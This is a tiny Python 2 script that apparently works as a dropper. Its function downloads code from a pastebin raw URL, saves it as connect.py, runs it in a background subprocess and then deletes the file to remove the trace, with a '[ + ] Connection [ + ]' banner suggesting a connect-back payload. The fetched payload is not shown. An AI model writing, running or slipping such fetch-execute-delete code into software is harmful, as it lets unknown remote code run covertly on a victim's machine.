import os
import urllib
import subprocess

filz = "http://pastebin.com/raw/qNjByHqW"

def ran():
        print "[ + ] Connection [ + ]"
	testfile = urllib.URLopener()
	testfile.retrieve(filz, "connect.py")
	subprocess.Popen(["python","connect.py"])
	os.remove("connect.py")
